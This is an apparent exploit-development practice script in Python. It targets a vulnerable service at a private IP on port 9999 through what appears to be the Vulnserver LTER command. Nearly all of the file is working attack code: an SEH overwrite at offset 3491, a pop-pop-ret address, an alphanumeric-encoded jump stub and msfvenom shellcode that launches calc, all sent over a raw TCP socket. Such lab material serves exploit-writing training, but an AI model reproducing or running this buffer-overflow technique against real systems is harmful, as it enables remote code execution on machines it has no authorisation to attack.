#!/usr/bin/python3

import struct
import subprocess
import socket

target_ip = "192.168.255.132"
target_port = 9999

def make_string(offset):
    prepend = b"LTER /.:/"
    #cmd = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l %d" %offset
    #pattern = subprocess.check_output(cmd, shell=True)
    #NSEH offset is 3491
    #SEH offset is 3495
    # msfvenom -p windows/exec CMD="calc" EXITFUNC=seh BufferRegister=EDI -f python -e x86/alpha_mixed
    buf =  b""
    buf += b"\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
    buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
    buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
    buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
    buf += b"\x39\x6c\x7a\x48\x4d\x52\x57\x70\x75\x50\x45\x50\x31"
    buf += b"\x70\x4b\x39\x6a\x45\x50\x31\x69\x50\x31\x74\x4c\x4b"
    buf += b"\x52\x70\x54\x70\x4c\x4b\x73\x62\x64\x4c\x6e\x6b\x56"
    buf += b"\x32\x75\x44\x4c\x4b\x44\x32\x65\x78\x56\x6f\x6c\x77"
    buf += b"\x43\x7a\x67\x56\x45\x61\x39\x6f\x6c\x6c\x57\x4c\x73"
    buf += b"\x51\x71\x6c\x55\x52\x56\x4c\x55\x70\x6a\x61\x68\x4f"
    buf += b"\x34\x4d\x73\x31\x69\x57\x69\x72\x58\x72\x31\x42\x51"
    buf += b"\x47\x6c\x4b\x76\x32\x36\x70\x6c\x4b\x42\x6a\x77\x4c"
    buf += b"\x4e\x6b\x62\x6c\x46\x71\x64\x38\x59\x73\x47\x38\x37"
    buf += b"\x71\x6e\x31\x52\x71\x6e\x6b\x31\x49\x77\x50\x43\x31"
    buf += b"\x69\x43\x4c\x4b\x52\x69\x36\x78\x68\x63\x67\x4a\x62"
    buf += b"\x69\x4c\x4b\x54\x74\x4c\x4b\x65\x51\x68\x56\x44\x71"
    buf += b"\x49\x6f\x4c\x6c\x39\x51\x6a\x6f\x34\x4d\x35\x51\x49"
    buf += b"\x57\x55\x68\x39\x70\x72\x55\x68\x76\x46\x63\x43\x4d"
    buf += b"\x4b\x48\x75\x6b\x61\x6d\x56\x44\x63\x45\x4d\x34\x71"
    buf += b"\x48\x4c\x4b\x32\x78\x51\x34\x66\x61\x68\x53\x72\x46"
    buf += b"\x4c\x4b\x46\x6c\x72\x6b\x6c\x4b\x46\x38\x37\x6c\x47"
    buf += b"\x71\x59\x43\x6e\x6b\x43\x34\x4e\x6b\x33\x31\x5a\x70"
    buf += b"\x4e\x69\x30\x44\x64\x64\x61\x34\x43\x6b\x71\x4b\x43"
    buf += b"\x51\x32\x79\x33\x6a\x32\x71\x79\x6f\x69\x70\x31\x4f"
    buf += b"\x63\x6f\x62\x7a\x6e\x6b\x56\x72\x58\x6b\x4c\x4d\x73"
    buf += b"\x6d\x55\x38\x76\x53\x77\x42\x33\x30\x43\x30\x30\x68"
    buf += b"\x63\x47\x42\x53\x70\x32\x63\x6f\x46\x34\x75\x38\x52"
    buf += b"\x6c\x64\x37\x45\x76\x35\x57\x39\x6f\x59\x45\x4e\x58"
    buf += b"\x4a\x30\x73\x31\x63\x30\x55\x50\x77\x59\x6b\x74\x31"
    buf += b"\x44\x70\x50\x43\x58\x74\x69\x4d\x50\x72\x4b\x73\x30"
    buf += b"\x59\x6f\x38\x55\x51\x7a\x75\x58\x61\x49\x46\x30\x78"
    buf += b"\x62\x59\x6d\x57\x30\x62\x70\x33\x70\x56\x30\x62\x48"
    buf += b"\x59\x7a\x74\x4f\x4b\x6f\x6b\x50\x59\x6f\x79\x45\x6e"
    buf += b"\x77\x42\x48\x46\x62\x75\x50\x65\x54\x68\x52\x6f\x79"
    buf += b"\x58\x66\x31\x7a\x36\x70\x42\x76\x70\x57\x42\x48\x6b"
    buf += b"\x72\x79\x4b\x46\x57\x33\x57\x39\x6f\x78\x55\x72\x77"
    buf += b"\x62\x48\x48\x37\x4a\x49\x35\x68\x6b\x4f\x59\x6f\x5a"
    buf += b"\x75\x53\x67\x73\x58\x44\x34\x7a\x4c\x37\x4b\x4d\x31"
    buf += b"\x49\x6f\x4a\x75\x71\x47\x4f\x67\x65\x38\x61\x65\x72"
    buf += b"\x4e\x72\x6d\x73\x51\x6b\x4f\x6e\x35\x73\x58\x51\x73"
    buf += b"\x50\x6d\x73\x54\x77\x70\x4f\x79\x68\x63\x32\x77\x50"
    buf += b"\x57\x51\x47\x70\x31\x6b\x46\x33\x5a\x37\x62\x42\x79"
    buf += b"\x51\x46\x78\x62\x69\x6d\x71\x76\x7a\x67\x72\x64\x75"
    buf += b"\x74\x45\x6c\x35\x51\x66\x61\x6c\x4d\x71\x54\x75\x74"
    buf += b"\x66\x70\x4f\x36\x73\x30\x67\x34\x70\x54\x56\x30\x71"
    buf += b"\x46\x61\x46\x42\x76\x47\x36\x52\x76\x52\x6e\x42\x76"
    buf += b"\x70\x56\x53\x63\x36\x36\x33\x58\x43\x49\x7a\x6c\x77"
    buf += b"\x4f\x4d\x56\x59\x6f\x4a\x75\x6d\x59\x59\x70\x32\x6e"
    buf += b"\x73\x66\x37\x36\x6b\x4f\x64\x70\x30\x68\x67\x78\x4f"
    buf += b"\x77\x77\x6d\x31\x70\x49\x6f\x39\x45\x6d\x6b\x69\x6e"
    buf += b"\x46\x6e\x35\x62\x69\x7a\x62\x48\x49\x36\x4a\x35\x4d"
    buf += b"\x6d\x4d\x4d\x59\x6f\x5a\x75\x45\x6c\x43\x36\x71\x6c"
    buf += b"\x65\x5a\x4b\x30\x4b\x4b\x59\x70\x72\x55\x55\x55\x4d"
    buf += b"\x6b\x57\x37\x36\x73\x70\x72\x72\x4f\x70\x6a\x57\x70"
    buf += b"\x51\x43\x49\x6f\x68\x55\x41\x41"
 
    long_jump = b"\x41\x54\x58\x2D\x7F\x7F\x7F\x7F\x2D\x08\x60\x7F\x7F\x2D\x01\x0F\x01\x01\x50\x5C\x68\x41\x41\x41\x41\x58\x35\x41\x41\x41\x41\x2D\x7F\x05\x52\x52\x2D\x0F\x04\x5E\x5E\x2D\x0D\x04\x50\x4F\x50\x68\x41\x41\x41\x41\x58\x35\x41\x41\x41\x41\x2D\x7F\x7F\x7F\x10\x2D\x20\x30\x30\x03\x2D\x20\x0F\x0F\x03\x50"
    nseh = b"\x42\x77\xff\x42"
    seh = struct.pack("<I", 0x6250120b)
    junk = buf + b"\x90"*(offset - 125 - len(buf)) + long_jump + b"\x41" * (125 - len(long_jump))
    afterjunk = b"D"*100
    attack_string = prepend + junk + nseh + seh + afterjunk
    return attack_string

def exploit(crash_string):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    response = s.recv(2048)
    print(response.decode())
    s.send(crash_string)

def main():
    offset = 3491
    crash_string = make_string(offset)
    exploit(crash_string)

if __name__ == '__main__':
    main()
